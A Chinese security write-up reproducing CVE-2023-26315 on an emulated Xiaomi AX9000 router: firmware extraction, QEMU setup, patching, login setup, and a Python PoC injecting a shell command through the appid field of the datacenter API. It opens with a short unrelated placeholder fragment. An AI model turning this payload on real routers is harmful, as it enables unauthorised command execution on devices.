
进入`/path/to/xxx`目录，找到`xxx.json`。

在表达式`cvar = avar + bvar`中，加法运算符（`+`）将`avar`与`bvar`相加，得到它们的和`cvar`

在`List.of(arg0, arg1, arg2)`中，`List`接口的工厂方法`of()`接受一系列的元素，返回包含它们的只读列表。

之后我们这样调用`cmd`命令：`cmd arg0 arg1 arg2`。

```
if (condVar > someVal) {console.log("xxx")}
```
[/content]

[content]
`binwalk -Me miwifi_ra70_firmware_cc424_1.0.168.bin`
`cd _miwifi_ra70_firmware_cc424_1.0.168.bin.extracted`
`ubireader_extract_images 2B4.ubi` `// 得到的文件会放入在ubifs-root的2B4.ubi文件夹中(不执行这个指令是没有这个文件夹的)`
`cd ubifs-root`
`cd 2B4.ubi`
`binwalk -Me img-870537086_vol-ubi_rootfs.ubifs`
`cd _img-870537086_vol-ubi_rootfs.ubifs.extracted`

### **配置qemu虚拟机网络**

完成之后就可以启动我们已经配置好的`qemu虚拟机`(需要手动配置ip地址)

```
 // 使用./qemu-start.sh来启动qemu虚拟机
 // 启动完成之后登入root用户，密码为xidp
 // 之后按照下面指令配置ip地址
ip add add 192.168.122.130/24 dev enp0s1
ip link set enp0s1 up
ip route add default via 192.168.122.1
```

设置之后尝试ping一下主机来验证ip地址来查看是否设置成功

### **patch修改文件**

为了能够跳过小米路由器的初始化这里需要patch其中的文件

patch的文件为`/squashfs-root/usr/sbin/sysapihttpd`

找到如图所示部分进行修改将 `CBZ` 修改为 `CBNZ`

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1005607_FZ4857248MGJSMZ.webp)

### **使用scp传输向qemu虚拟机传输文件**

`patch`之后替换掉原本的文件随后使用`scp`传入`qemu虚拟机`中

```
 // 在Ubuntu物理机中压缩并传输
tar -czf squashfs-root.tar.gz ./squashfs-root/
scp -o HostKeyAlgorithms=ssh-rsa squashfs-root.tar.gz root@192.168.122.130:/root/
 // 下面在qemu虚拟机中解压
tar -xzf squashfs-root.tar.gz
```

使用这个方法会出现一个问题，明明使用root用户传输密码是对的，但是它就是显示不对，这是并不是密码的缘故而是ssh禁止了使用root用户登入

我们需要做一个修改，否则后续依旧只能使用普通用户来传输很麻烦

在root用户下使用下面指令修改ssh配置文件

```
nano /etc/ssh/sshd_config
```

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1005607_ESPQ3849K4S3P75.webp)

修改完毕之后重启ssh服务

```
systemctl restart sshd
```

然后再次使用上述`scp`指令就可以进行传输了

### **启动httpd服务**

之后就可以准备启动httpd服务

执行下面几个指令(这里是按照wimmt师傅文章中的内容做了一个总结，只需要按照顺序复制粘贴到qemu虚拟机中就可以成功启动小米路由器的仿真)

```
cd /root/squashfs-root
mount --bind /proc proc
mount --bind /dev dev
chroot .
/bin/sh
mkdir -p /var/run
touch /var/run/ubus.sock
mkdir -p /var/lock
touch /var/lock/procd_sysapihttpd.lock
/sbin/procd &
sleep 3
/sbin/ubusd &
sleep 2
echo "WAUST-8WAUDT" > /etc/TZ
/etc/init.d/sysapihttpd start
```

执行之后就可以访问 `192.168.122.130`

它会自动定位到这里路由器的初始化配置页面

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1005607_JUDMXSFH794J5AD.webp)

因为初始化部分和硬件相关所以我们需要想个办法绕过

也就是执行下面这两个指令

```
uci set xiaoqiang.common.INITTED=1
uci commit
 // 输出验证是否成功写入
uci show | grep INITTED
```

设置好之后再次访问就可以绕过初始化配置，直接跳转到登入页面

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1005607_TNB8V9E7DESMHP7.webp)

`注意这里是重新访问，不是刷新界面`

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1005607_84JFZUQB9ZMMW8U.webp)

由于我们复现的`CVE-2023-26315`是一个授权认证后的漏洞，因此我们需要设置登录密码以登录进后台拿到`token`的值

所以下面我们需要尝试登入它

阅读它的web页面源码来查看它的密码的加密逻辑是什么

`F12`之后查看`web`内容，分别在`440行`和`1722行`可以看到

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1005607_JF9JKJ5BCTTSQ56.webp)

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1005607_6WVNXECWPTWHM8P.webp)

由此可以看出，我们的用户名是固定为`admin`，而密码是通过一个叫 `oldPwd()函数` 加密之后的结果。

这个 `oldPwd()函数` 将`用户提交的密码`和一个固定的`key = a2ffa5c9be07488bbb04a3a47d3c5f6a`组合之后使用`sha1哈希`进行一个加密

```
真实密码 = sha1(用户设置的密码 + a2ffa5c9be07488bbb04a3a47d3c5f6a)
```

下面我们假设我们设置的用户密码为 `xidp`

那么我们需要给`account.common.admin`这个`uci`配置为`sha1(xidpa2ffa5c9be07488bbb04a3a47d3c5f6a)`

```
sha1(xidpa2ffa5c9be07488bbb04a3a47d3c5f6a) = 32c98a6b9ffd5226b7ca5e8336e2e50bbfa6fb10
```

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1005607_7PV3NXTKWWWMUEC.webp)

那么我们使用下面指令来设置密码

```
uci set account.common.admin=32c98a6b9ffd5226b7ca5e8336e2e50bbfa6fb10
uci commit
uci show | grep admin
```

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1005607_5KVKTQPU7FQK69U.webp)

下面就可以成功使用密码xidp登入了

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1005607_X3VB9QBYB3MWF36.webp)

### **没用的部分**

也是进入到这个界面发现这个小米路由器AX9000的造型看起来有点酷

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1005607_97AB79XZRG4YV3N.webp)

本来想淘宝买一个看看能不能实机打一下，淘宝看了一下价格感觉还是算了`o(╥﹏╥)o`

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1005607_6SQJ35FGQZ2EZGN.webp)

## 漏洞复现

这里先简单使用winmt师傅的PoC来演示漏洞效果，随后再介绍漏洞成因

这里先对着这个小米路由器的配置界面抓个包，得到我们现在的token值

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1005607_GW9ZZM63A2J79F9.webp)

抓包得到的内容如下

```
GET /cgi-bin/luci/;stok=26a8470f16d4a0c8a03a8e503549b3ee/web/home HTTP/1.1
Host: 192.168.122.130
Cookie: __guid=82176214.4122683288115647000.1762159952222.404; monitor_count=6; psp=admin|||2|||0
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```

可以得知我们的`token=26a8470f16d4a0c8a03a8e503549b3ee`

然后qemu虚拟机启动这两个服务

```
/usr/sbin/datacenter &
/usr/sbin/plugincenter &
```

接着编写我们的PoC，如下所示(我本来是想拿shell的，但是尝试几次之后都没有连接上，不知道什么原因，为了展示命令执行成功，我将指令换成了创建文件666666)

```python
import requests

server_ip = "192.168.122.130"
token = "26a8470f16d4a0c8a03a8e503549b3ee"

test_cmd = ";touch /tmp/666666 #"
res = requests.post(
"http://{}/cgi-bin/luci/;stok={}/api/xqdatacenter/request".format(server_ip, token),
data={'payload':'{"api":629, "appid":"' + test_cmd + '"}'}
)

print("响应:", res.text)
```

接着运行我们的脚本

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1005607_ER46A53JV867BPR.webp)

到这里就算是成功复现了，我们可以直接使用指令退出我们的qemu虚拟机了

```
shutdown -h now
```

## 漏洞原理分析

复现成功之后我们再来看我们这命令执行漏洞具体产生的原因是什么

小米路由器的前端是使用Lua来编写的，而且其中存放的Lua文件并不是源码而是已经编译后的二进制文件，同时小米对Lua的解释器做了魔改。

但是没有关系github上已经有了专门针对小米路由器Lua的反编译工具: [NyaMisty/unluac_miwifi](https://bbs.kanxue.com/elink@22dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6z5P5h3q4y4K9i4y4@1P5g2)9J5c8Y4g2F1L8s2g2S2j5#2)9#2k6X3#2A6N6$3W2X3K9b7`.`.)

### **Lua反汇编和分析**

由于需要反编译的数量比较多，所以我们简单写一个脚本来批量反编译

修改脚本

```python
import os

source_base = "/home/xidp/myfile/iot/xiaomi_ax9000/_miwifi_ra70_firmware_cc424_1.0.168.bin.extracted/ubifs-root/2B4.ubi/_img-870537086_vol-ubi_rootfs.ubifs.extracted/squashfs-root/usr/"
output_base = "/home/xidp/myfile/iot/xiaomi_ax9000/luac"
# 指定输出目录

os.makedirs(output_base, exist_ok=True)
res = os.popen(f"find {source_base} -name *.lua").readlines()

for i in range(0, len(res)):
    source_path = res[i].strip("\n")

    relative_path = os.path.relpath(source_path, source_base)
    output_path = os.path.join(output_base, relative_path + ".dis")

    os.makedirs(os.path.dirname(output_path), exist_ok=True)

    cmd = f"java -jar /home/xidp/tools/unluac_miwifi/unluac.jar {source_path} > {output_path}"
    print(f"反编译: {source_path} -> {output_path}")
    os.system(cmd)
```

下面我们打开反编译的 `/usr/lib/lua/luci/controller/api/xqdatacenter.lua`

可以看到大致如下内容
